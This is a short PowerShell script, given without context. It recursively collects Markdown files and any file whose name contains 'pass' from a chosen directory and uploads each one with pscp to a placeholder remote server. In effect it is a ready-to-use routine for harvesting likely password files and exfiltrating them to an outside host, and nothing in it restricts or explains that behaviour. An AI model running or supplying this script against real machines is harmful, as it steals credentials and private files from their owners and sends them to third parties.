# Define the directory to search
$searchDirectory = "C:\Path\To\Search"

# Define the patterns to search for
$patterns = @("*.md", "*pass*")

# Define the remote server details
$remoteServer = "username@remote.server.com"
$remotePath = "/path/on/server/"
$scpPath = "C:\Path\To\pscp.exe" # Path to pscp.exe

# Function to send file using SCP
function Send-File {
    param (
        [string]$filePath
    )
    & $scpPath $filePath "${remoteServer}:${remotePath}"
}

# Search and send files
foreach ($pattern in $patterns) {
    $files = Get-ChildItem -Path $searchDirectory -Filter $pattern -Recurse -File
    foreach ($file in $files) {
        Write-Host "Sending $($file.FullName) to $remoteServer"
        Send-File -filePath $file.FullName
    }
}